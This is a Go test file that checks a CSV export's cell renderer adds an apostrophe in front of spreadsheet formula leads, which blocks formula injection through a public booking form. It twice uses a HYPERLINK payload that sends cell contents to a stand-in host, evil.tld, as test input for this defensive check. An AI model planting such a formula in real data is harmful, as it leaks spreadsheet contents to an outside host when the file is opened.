// SPDX-License-Identifier: BUSL-1.1
// SPDX-FileCopyrightText: 2026 Gradion

package compose

// A CSV export is opened in a spreadsheet, which auto-evaluates any cell that
// begins with a formula lead (= + - @ TAB CR). A stored text value like
// `=HYPERLINK(...)` — plantable unauthenticated through the public booking
// form onto a person's name — must therefore leave the export as literal text,
// never a live formula. Both CSV writers (the full bundle and the filtered
// export) render every cell through csvCell, so the guard is proven at that
// choke point and again through the filtered-export render path a client hits.

import (
	"encoding/csv"
	"strings"
	"testing"
)

func TestCSVCellDefusesSpreadsheetFormulas(t *testing.T) {
	// Every formula lead, each asserted to be prefixed with exactly one
	// apostrophe and otherwise unchanged — the raw value must never reach the
	// cell able to execute on open.
	for _, in := range []string{
		`=HYPERLINK("https://evil.tld/x?d="&A1&B1,"click")`,
		"+49 30 1234567",
		"-2+3",
		"@SUM(A1:A9)",
		"\tstarts-with-tab",
		"\rstarts-with-cr",
	} {
		got := csvCell(in)
		if want := "'" + in; got != want {
			t.Errorf("csvCell(%q) = %q, want the apostrophe-guarded literal %q", in, got, want)
		}
	}

	// The []byte branch (a jsonb / text driver value) is guarded identically to
	// the string branch: a formula-leading []byte must gain exactly one
	// apostrophe, not slip through as a live formula.
	if got := csvCell([]byte("=1+1")); got != "'=1+1" {
		t.Errorf("csvCell([]byte(%q)) = %q, want %q", "=1+1", got, "'=1+1")
	}

	// A value that is not a formula lead is passed through untouched:
	// over-guarding would corrupt ordinary data and teach readers to ignore
	// the apostrophe where it matters.
	for _, safe := range []string{"Ada Lovelace", "acme corp", "", "1 Main St", "0.5x", "true"} {
		if got := csvCell(safe); got != safe {
			t.Errorf("csvCell(%q) = %q, want it unchanged", safe, got)
		}
	}

	// A typed numeric value is system-rendered, never attacker free text, so a
	// legitimately negative amount keeps its sign without gaining a quote — the
	// guard is scoped to the text branches for exactly this reason.
	if got := csvCell(int64(-5000)); got != "-5000" {
		t.Errorf("csvCell(int64(-5000)) = %q, want %q (a number, not a guarded formula)", got, "-5000")
	}
}

func TestFilteredExportCSVDefusesFormulaInjection(t *testing.T) {
	// The exact render path the filtered-export handler calls (renderExport):
	// a person named `=HYPERLINK(...)` exported to CSV must round-trip through
	// a spreadsheet importer as the neutralized literal, not the bare formula.
	payload := `=HYPERLINK("https://evil.tld/x?d="&A1&B1,"click")`
	data := memberData{
		table:   "person",
		columns: []string{"full_name"},
		rows:    [][]any{{payload}},
	}

	body, contentType, err := renderExport(data, exportFmtCSV)
	if err != nil {
		t.Fatalf("renderExport: %v", err)
	}
	if contentType != "text/csv; charset=utf-8" {
		t.Fatalf("content type = %q, want text/csv", contentType)
	}

	records, err := csv.NewReader(strings.NewReader(string(body))).ReadAll()
	if err != nil {
		t.Fatalf("re-read exported CSV: %v", err)
	}
	if len(records) != 2 || len(records[1]) != 1 {
		t.Fatalf("records = %v, want a header row plus one data row of one field", records)
	}
	if got, want := records[1][0], "'"+payload; got != want {
		t.Errorf("exported cell = %q, want the apostrophe-guarded literal %q", got, want)
	}
}
